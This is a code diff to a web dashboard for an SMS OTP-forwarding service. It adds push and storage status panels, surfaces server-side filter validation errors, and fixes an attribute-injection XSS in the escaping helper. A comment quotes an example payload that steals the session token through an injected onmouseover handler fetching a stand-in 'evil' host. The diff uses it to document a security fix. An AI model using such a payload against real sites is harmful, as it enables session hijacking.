@@ -92,6 +92,9 @@
         .config-add button{padding:9px 16px;background:var(--teal-dim);border:1px solid rgba(0,212,170,0.3);border-radius:8px;color:var(--teal);font-weight:600;font-size:12px;cursor:pointer;transition:all .15s;white-space:nowrap}.config-add button:hover{background:rgba(0,212,170,0.2)}
         .setting-row{display:flex;align-items:center;gap:12px;margin-bottom:10px}.setting-row label{font-size:13px;color:var(--text-2);min-width:160px}
         .setting-row input[type=number]{width:80px;padding:8px 12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:var(--text-1);font-family:var(--mono);font-size:13px;outline:none}.setting-row input:focus{border-color:var(--teal)}
+        .fcm-status{font-family:var(--mono);font-size:12px;line-height:1.7;color:var(--text-2);white-space:pre-wrap;word-break:break-word}
+        .fcm-status .fcm-ok{color:var(--teal)}.fcm-status .fcm-bad{color:var(--red)}.fcm-status .fcm-idle{color:var(--text-3)}
+        .config-error{display:none;margin:0 0 12px;padding:11px 14px;background:rgba(255,77,77,0.08);border:1px solid rgba(255,77,77,0.35);border-radius:var(--radius);color:var(--red);font-size:12.5px;line-height:1.55;white-space:pre-wrap;word-break:break-word;font-family:var(--mono)}.config-error.show{display:block}
         .save-config-btn{padding:12px 24px;background:var(--teal);border:none;border-radius:var(--radius);color:#021a15;font-weight:700;font-size:14px;cursor:pointer;transition:all .15s;margin-top:8px}.save-config-btn:hover{opacity:0.9;transform:translateY(-1px)}
     </style>
 </head>
@@ -162,6 +165,27 @@
             <div class="config-section"><h4>Settings</h4>
                 <div class="setting-row"><label>Auto-delete (minutes)</label><input type="number" id="cfgAutoDelete" min="1" max="1440" value="30"></div>
             </div>
+            <!-- fcm.getStatus() has been on /api/full-settings for several
+                 releases and nothing rendered it. send() is fire-and-forget by
+                 design, so a broken service account is completely silent: the
+                 toggle still returns 200 and the phone simply never hears. This
+                 is the first place to look when push "feels slow". -->
+            <div class="config-section"><h4>Push (FCM)</h4>
+                <div id="fcmStatus" class="fcm-status">—</div>
+            </div>
+            <!-- Which source the running filters came from, and whether your last
+                 save actually reached durable storage. Without this, "saved
+                 locally but not to the cloud" is indistinguishable from "saved",
+                 and you would only find out at the next redeploy. -->
+            <div class="config-section"><h4>Config storage</h4>
+                <div id="configStatus" class="fcm-status">—</div>
+            </div>
+            <!-- Filled by saveConfig() when the server REFUSES a pattern. The
+                 server validates (a double-escaped or group-less pattern can
+                 never match and would silently lose every OTP from that
+                 sender); without somewhere to put the reason, that validation
+                 was invisible here and the modal reported success anyway. -->
+            <div id="configError" class="config-error"></div>
             <button class="save-config-btn" onclick="saveConfig()">💾 Save All Changes</button>
         </div>
     </div>
@@ -177,6 +201,8 @@
     let eventSource = null;
     let configFilters = [];
     let autoDeleteMinutes = 30;
+    let fcmStatus = null;
+    let configStatus = null;
     let expiryTimer = null;
 
     // ═══════════════════════════════════════════════════════════
@@ -266,6 +292,8 @@
                 globalForwarding = s.globalForwarding;
                 configFilters = s.filters || [];
                 autoDeleteMinutes = s.autoDeleteMinutes || 30;
+                fcmStatus = s.fcm || null;
+                configStatus = s.config || null;
                 updateToggleBtn();
             }
 
@@ -537,9 +565,101 @@
     //  CONFIG MODAL
     // ═══════════════════════════════════════════════════════════
     function openConfig() {
+        clearConfigError();
         document.getElementById('configOverlay').classList.add('open');
         document.getElementById('cfgAutoDelete').value = autoDeleteMinutes;
         renderConfigFilters();
+        renderFcmStatus();
+        renderConfigStatus();
+        refreshFcmStatus();          // re-read: the cached copy is from login time
+    }
+
+    async function refreshFcmStatus() {
+        try {
+            const res = await fetch('/api/full-settings', { headers: authHeaders() });
+            if (!res.ok) return;
+            const s = await res.json();
+            fcmStatus = s.fcm || null;
+            configStatus = s.config || null;
+            renderFcmStatus();
+            renderConfigStatus();
+        } catch (e) { /* the cached value stays on screen */ }
+    }
+
+    /**
+     * Where the running config came from, and whether it is safely stored.
+     *
+     * "source" is the first thing to look at when the filters are not what you
+     * expect: `env defaults` means the catch-all is live, which is the state
+     * that silently costs OTPs.
+     */
+    function renderConfigStatus() {
+        const el = document.getElementById('configStatus');
+        if (!configStatus) { el.textContent = 'unknown — reload the dashboard'; return; }
+        const rows = [];
+        const src = configStatus.source || 'unknown';
+
+        rows.push(src === 'env defaults'
+            ? '<span class="fcm-bad">running on env defaults</span> — these filters are the '
+              + 'catch-all and will not survive anything. Save your filters to fix this.'
+            : 'source: <span class="fcm-ok">' + esc(src) + '</span>');
+
+        const fs = configStatus.firestore || {};
+        if (!fs.enabled) {
+            rows.push('<span class="fcm-idle">durable storage off — config is lost on redeploy</span>');
+        } else if (fs.pendingWrite) {
+            rows.push('<span class="fcm-bad">saved locally, NOT yet in the cloud</span>'
+                + (fs.lastError ? '<br><span class="fcm-bad">' + esc(fs.lastError) + '</span>' : ''));
+        } else if (fs.lastWriteAt) {
+            const when = new Date(fs.lastWriteAt).toLocaleString('en-GB', { timeZone: 'Asia/Dhaka' });
+            rows.push('<span class="fcm-ok">saved</span> — last write ' + esc(when));
+        } else {
+            rows.push('<span class="fcm-ok">durable storage on</span>');
+        }
+
+        if (configStatus.deferred > 0) {
+            rows.push('<span class="fcm-idle">' + configStatus.deferred
+                + ' message(s) awaiting the real config</span>');
+        }
+        el.innerHTML = rows.join('<br>');
+    }
+
+    /**
+     * "configured" first — that is the answer to "why is the toggle slow?" far
+     * more often than anything else. lastOk is the second: send() never throws
+     * into a route, so a revoked key or a quota error only ever showed up here.
+     */
+    function renderFcmStatus() {
+        const el = document.getElementById('fcmStatus');
+        if (!fcmStatus) { el.textContent = 'unknown — reload the dashboard'; return; }
+
+        const rows = [];
+        rows.push(fcmStatus.configured
+            ? '<span class="fcm-ok">configured</span> — push is available'
+            : '<span class="fcm-bad">NOT configured</span> — FIREBASE_SERVICE_ACCOUNT is unset, '
+              + 'so every command falls back to the 30s poller and the 15min worker');
+
+        if (fcmStatus.lastAt) {
+            const when = new Date(fcmStatus.lastAt).toLocaleString('en-GB', { timeZone: 'Asia/Dhaka' });
+            const verdict = fcmStatus.lastOk
+                ? '<span class="fcm-ok">delivered to Google</span>'
+                : '<span class="fcm-bad">FAILED</span>';
+            rows.push('last send: ' + esc(fcmStatus.lastAction || '?') + ' at ' + esc(when) + ' — ' + verdict);
+            if (!fcmStatus.lastOk && fcmStatus.lastError) {
+                rows.push('<span class="fcm-bad">' + esc(fcmStatus.lastError) + '</span>');
+            }
+        } else {
+            rows.push('<span class="fcm-idle">no push sent yet this server run</span>');
+        }
+
+        if (fcmStatus.ttlSeconds) {
+            rows.push('<span class="fcm-idle">ttl: '
+                + esc(Object.entries(fcmStatus.ttlSeconds).map(([k, v]) => k + ' ' + v + 's').join(', '))
+                + '</span>');
+        }
+        // "delivered to Google" is deliberate wording: FCM accepting a message
+        // is not the phone receiving it. Nothing here can prove the second.
+        el.innerHTML = rows.join('<br>');
     }
     function closeConfig() { document.getElementById('configOverlay').classList.remove('open'); }
 
@@ -601,27 +721,133 @@
         renderConfigFilters();
     }
 
-    async function saveConfig() {
+    function showConfigError(text) {
+        const el = document.getElementById('configError');
+        el.textContent = text;               // textContent: server text, never markup
+        el.classList.add('show');
+    }
+
+    function clearConfigError() {
+        const el = document.getElementById('configError');
+        el.textContent = '';
+        el.classList.remove('show');
+    }
+
+    /** Why a non-2xx reply happened, in the server's own words where it has them. */
+    async function describeFailure(res) {
         try {
-            await fetch('/api/filters', { method: 'POST', headers: authHeaders(), body: JSON.stringify({ filters: configFilters }) });
+            const err = await res.json();
+            if (Array.isArray(err.problems) && err.problems.length) {
+                return (err.error ? err.error + ':\n' : '') + err.problems.join('\n');
+            }
+            if (err.error) return err.error;
+        } catch (e) { /* not JSON — fall through to the status code */ }
+        return 'Server refused the request (HTTP ' + res.status + ')';
+    }
+
+    /**
+     * Save filters and auto-delete.
+     *
+     * =======================================================================
+     * THIS USED TO REPORT SUCCESS WHATEVER THE SERVER SAID
+     *
+     * Both fetches were awaited and neither result was read, so the function
+     * showed "Settings saved" and closed the modal even on a 400. The server
+     * refuses patterns that can never match — a double-escaped `(\\d{4,8})`
+     * pasted out of JSON, or one with no capture group — precisely so the
+     * mistake surfaces when you save it rather than the next time you need an
+     * OTP. That guard fired correctly and was invisible at the only place
+     * anyone uses it.
+     *
+     * Filters are saved FIRST and a failure returns immediately: the two
+     * settings are independent, and saving auto-delete after the filters were
+     * rejected would leave the modal reporting a partial success it cannot
+     * describe. The modal stays OPEN on failure, so the rejected patterns are
+     * still on screen next to the reason.
+     * =======================================================================
+     */
+    async function saveConfig() {
+        clearConfigError();
+        try {
+            const fRes = await fetch('/api/filters', {
+                method: 'POST', headers: authHeaders(),
+                body: JSON.stringify({ filters: configFilters })
+            });
+            if (fRes.status === 401) { notify('🔑 Session expired — sign in again'); doLogout(); return; }
+            if (!fRes.ok) {
+                showConfigError(await describeFailure(fRes));
+                notify('⚠️ Filters not saved');
+                return;
+            }
+
             const mins = parseInt(document.getElementById('cfgAutoDelete').value, 10) || 30;
-            await fetch('/api/auto-delete', { method: 'POST', headers: authHeaders(), body: JSON.stringify({ minutes: mins }) });
+            const aRes = await fetch('/api/auto-delete', {
+                method: 'POST', headers: authHeaders(),
+                body: JSON.stringify({ minutes: mins })
+            });
+            if (aRes.status === 401) { notify('🔑 Session expired — sign in again'); doLogout(); return; }
+            if (!aRes.ok) {
+                // Filters DID save. Say so, or the next attempt looks like a
+                // no-op and the real failure gets attributed to the patterns.
+                showConfigError('Filters saved. Auto-delete was not: '
+                    + (await describeFailure(aRes)));
+                notify('⚠️ Auto-delete not saved');
+                return;
+            }
+
             autoDeleteMinutes = mins;
             notify('💾 Settings saved');
             closeConfig();
-        } catch (e) { notify('⚠️ Save failed'); }
+        } catch (e) {
+            showConfigError('Could not reach the server — nothing was saved.');
+            notify('⚠️ Save failed');
+        }
     }
 
     // ═══════════════════════════════════════════════════════════
     //  HELPERS
     // ═══════════════════════════════════════════════════════════
-    function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+    /**
+     * Escape for ANY HTML context this file uses — text nodes AND attribute
+     * values.
+     *
+     * =======================================================================
+     * WHY THIS IS NOT textContent -> innerHTML ANY MORE
+     *
+     * That idiom escapes < > & and NOTHING ELSE, because the HTML serialiser
+     * only escapes quotes when it is writing an attribute — and it never knows
+     * it is. Its output was then interpolated into two attributes here:
+     *
+     *     <option value="${esc(n)}">          n = recipient, from POST /sms
+     *     <div ... data-code="${esc(code)}">
+     *
+     * canonicalizePhone returns unparseable input verbatim (deliberately — see
+     * lib/phone.js), so a recipient of
+     *     x" onmouseover="fetch('//evil/'+localStorage.getotp_token)
+     * closed value="" and became a live event handler in the dashboard's own
+     * origin, where the session token lives. < and > were escaped, so the tag
+     * could not be closed — but an injected ATTRIBUTE needs neither.
+     *
+     * Escaping quotes here fixes every attribute site at once and costs
+     * nothing in a text context, where &quot; and &#39; render as " and '.
+     * Pinned by test/xss.test.js, which extracts this function and runs it.
+     * =======================================================================
+     */
+    function esc(s) {
+        return String(s === null || s === undefined ? '' : s)
+            .replace(/&/g, '&amp;')     // must be first, or it re-escapes the rest
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    }
 
-    // The code used to be interpolated into an inline onclick="copyCode('...')".
-    // esc() escapes < > &, but NOT quotes — so a code containing an apostrophe
-    // would have closed the JS string. Filter patterns can capture letters and
-    // punctuation, so that was reachable. Reading it from a data attribute keeps
-    // the value as data and never as source.
+    // The code used to be interpolated into an inline onclick="copyCode('...')",
+    // where a captured apostrophe would have closed the JS string. Reading it
+    // from a data attribute keeps the value as data and never as source. That
+    // stays true even now esc() escapes quotes: escaped data still must not
+    // land inside inline JS, because the JS parser sees &#39; as three
+    // characters, not as a terminator it can be fooled by.
     document.addEventListener('click', (e) => {
         const el = e.target.closest('.sms-code');
         if (el && el.dataset.code) copyCode(el.dataset.code);
